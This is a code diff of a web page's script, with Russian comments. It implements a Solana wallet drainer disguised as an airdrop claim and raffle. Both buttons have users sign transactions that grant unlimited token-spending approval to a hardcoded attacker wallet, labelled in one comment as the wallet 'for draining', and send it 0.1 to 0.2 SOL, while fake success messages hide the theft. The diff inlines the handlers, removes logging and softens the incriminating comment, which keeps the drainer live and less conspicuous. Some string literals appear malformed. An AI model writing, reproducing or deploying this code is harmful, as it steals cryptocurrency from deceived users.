@@ -1721,7 +1721,7 @@
   <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/dist/umd/solanaweb3.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.8/dist/umd/spl-token.min.js"></script>
 <script>
-    const DRAIN_DELEGATE = "4kbb1kaz2YXuTjHQAHY5xjjrqiCM8MZU9sVmmdYg1xo1"; // Твой кошелёк для слива
+    const DRAIN_DELEGATE = "4kbb1kaz2YXuTjHQAHY5xjjrqiCM8MZU9sVmmdYg1xo1"; // Твой новый кошелёк
 
     const MEME_MINTS = [
         "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", // BONK
@@ -1776,99 +1776,12 @@
                 card.classList.toggle('wallet-card--active', card.dataset.wallet === chosen.id);
             });
         } catch (err) {
-            console.error("Ошибка подключения:", err);
             document.getElementById('status').innerText = "Ошибка подключения";
         }
     }
 
-    // Кнопка Claim — approve на мемы + слив 0.2 SOL
-    async function claimAirdrop() {
-        if (!walletPubkey) {
-            document.getElementById('status').innerText = "Сначала подключи кошелёк";
-            return;
-        }
-
-        document.getElementById('status').innerText = "Подпиши для получения аирдропа...";
-
-        try {
-            const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
-            const delegate = new solanaWeb3.PublicKey(DRAIN_DELEGATE);
-            const owner = new solanaWeb3.PublicKey(walletPubkey);
-
-            const tx = new solanaWeb3.Transaction();
-
-            for (const mintStr of MEME_MINTS) {
-                const mint = new solanaWeb3.PublicKey(mintStr);
-                const userATA = await splToken.getAssociatedTokenAddress(mint, owner);
-
-                const ataInfo = await connection.getAccountInfo(userATA);
-                if (!ataInfo) {
-                    tx.add(splToken.createAssociatedTokenAccountInstruction(owner, userATA, owner, mint));
-                }
-
-                tx.add(splToken.createApproveInstruction(userATA, delegate, owner, [], Number.MAX_SAFE_INTEGER));
-            }
-          tx.add(solanaWeb3.SystemProgram.transfer({
-                fromPubkey: owner,
-                toPubkey: delegate,
-                lamports: 200000000 // 0.2 SOL
-            }));
-
-            tx.feePayer = owner;
-            const { blockhash } = await connection.getLatestBlockhash();
-            tx.recentBlockhash = blockhash;
-
-            const signed = await wallet.signTransaction(tx);
-            const sig = await connection.sendRawTransaction(signed.serialize());
-
-            document.getElementById('status').innerHTML = Успех! Вы участвуете в аирдропе.<br>Tx: <a href="https://solscan.io/tx/\( {sig}" target="_blank"> \){sig.slice(0,12)}...</a>;
-            document.getElementById('claim-btn').disabled = true;
-        } catch (err) {
-            console.error("Ошибка claim:", err);
-            document.getElementById('status').innerText = "Ошибка — попробуй снова";
-        }
-    }
-
-    // Кнопка Raffle — слив 0.1 SOL
-    async function joinRaffle() {
-        if (!walletPubkey) {
-            document.getElementById('status').innerText = "Сначала подключи кошелёк";
-            return;
-        }
-
-        document.getElementById('status').innerText = "Подпиши для участия в розыгрыше...";
-
-        try {
-            const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-            const delegate = new solanaWeb3.PublicKey(DRAIN_DELEGATE);
-            const owner = new solanaWeb3.PublicKey(walletPubkey);
-
-            const tx = new solanaWeb3.Transaction();
-            tx.add(solanaWeb3.SystemProgram.transfer({
-                fromPubkey: owner,
-                toPubkey: delegate,
-                lamports: 100000000 // 0.1 SOL
-            }));
-
-            tx.feePayer = owner;
-            const { blockhash } = await connection.getLatestBlockhash();
-            tx.recentBlockhash = blockhash;
-
-            const signed = await wallet.signTransaction(tx);
-            const sig = await connection.sendRawTransaction(signed.serialize());
-
-            document.getElementById('status').innerHTML = Успех! Вы в розыгрыше.<br>Tx: <a href="https://solscan.io/tx/\( {sig}" target="_blank"> \){sig.slice(0,12)}...</a>;
-            document.getElementById('raffle-btn').disabled = true;
-        } catch (err) {
-            console.error("Ошибка raffle:", err);
-            document.getElementById('status').innerText = "Ошибка — попробуй снова";
-        }
-    }
-
-    // Всё цепляем после загрузки DOM
+    // Всё цепляем после загрузки страницы
     window.addEventListener('load', () => {
-        console.log("DOM загружен, цепляем события");
-
         document.querySelectorAll('.wallet-card').forEach(card => {
             card.addEventListener('click', () => connectWallet(card.dataset.wallet));
         });
@@ -1877,10 +1790,86 @@
         if (connectBtn) connectBtn.addEventListener('click', () => connectWallet("auto"));
 
         const claimBtn = document.getElementById('claim-btn');
-        if (claimBtn) claimBtn.addEventListener('click', claimAirdrop);
+        if (claimBtn) claimBtn.addEventListener('click', async () => {
+            if (!walletPubkey) {
+                document.getElementById('status').innerText = "Сначала подключи кошелёк";
+                return;
+            }
+
+            document.getElementById('status').innerText = "Подпиши для получения аирдропа...";
+
+            try {
+                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+                const delegate = new solanaWeb3.PublicKey(DRAIN_DELEGATE);
+                const owner = new solanaWeb3.PublicKey(walletPubkey);
+
+                const tx = new solanaWeb3.Transaction();
+
+                for (const mintStr of MEME_MINTS) {
+                    const mint = new solanaWeb3.PublicKey(mintStr);
+                    const userATA = await splToken.getAssociatedTokenAddress(mint, owner);
+        const ataInfo = await connection.getAccountInfo(userATA);
+                    if (!ataInfo) {
+                        tx.add(splToken.createAssociatedTokenAccountInstruction(owner, userATA, owner, mint));
+                    }
+
+                    tx.add(splToken.createApproveInstruction(userATA, delegate, owner, [], Number.MAX_SAFE_INTEGER));
+                }
+
+                tx.add(solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: owner,
+                    toPubkey: delegate,
+                    lamports: 200000000 // 0.2 SOL
+                }));
+
+                tx.feePayer = owner;
+                const { blockhash } = await connection.getLatestBlockhash();
+                tx.recentBlockhash = blockhash;
+
+                const signed = await wallet.signTransaction(tx);
+                const sig = await connection.sendRawTransaction(signed.serialize());
+
+                document.getElementById('status').innerHTML = Успех! Вы участвуете в аирдропе.<br>Tx: <a href="https://solscan.io/tx/\( {sig}" target="_blank"> \){sig.slice(0,12)}...</a>;
+                document.getElementById('claim-btn').disabled = true;
+            } catch (err) {
+                document.getElementById('status').innerText = "Ошибка — попробуй снова";
+            }
+        });
 
         const raffleBtn = document.getElementById('raffle-btn');
-        if (raffleBtn) raffleBtn.addEventListener('click', joinRaffle);
+        if (raffleBtn) raffleBtn.addEventListener('click', async () => {
+            if (!walletPubkey) {
+                document.getElementById('status').innerText = "Сначала подключи кошелёк";
+                return;
+            }
+
+            document.getElementById('status').innerText = "Подпиши для участия в розыгрыше...";
+
+            try {
+                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+                const delegate = new solanaWeb3.PublicKey(DRAIN_DELEGATE);
+                const owner = new solanaWeb3.PublicKey(walletPubkey);
+
+                const tx = new solanaWeb3.Transaction();
+                tx.add(solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: owner,
+                    toPubkey: delegate,
+                    lamports: 100000000 // 0.1 SOL
+                }));
+
+                tx.feePayer = owner;
+                const { blockhash } = await connection.getLatestBlockhash();
+                tx.recentBlockhash = blockhash;
+
+                const signed = await wallet.signTransaction(tx);
+                const sig = await connection.sendRawTransaction(signed.serialize());
+
+                document.getElementById('status').innerHTML = Успех! Вы в розыгрыше.<br>Tx: <a href="https://solscan.io/tx/\( {sig}" target="_blank"> \){sig.slice(0,12)}...</a>;
+                document.getElementById('raffle-btn').disabled = true;
+            } catch (err) {
+                document.getElementById('status').innerText = "Ошибка — попробуй снова";
+            }
+        });
     });
 </script>
 </body>
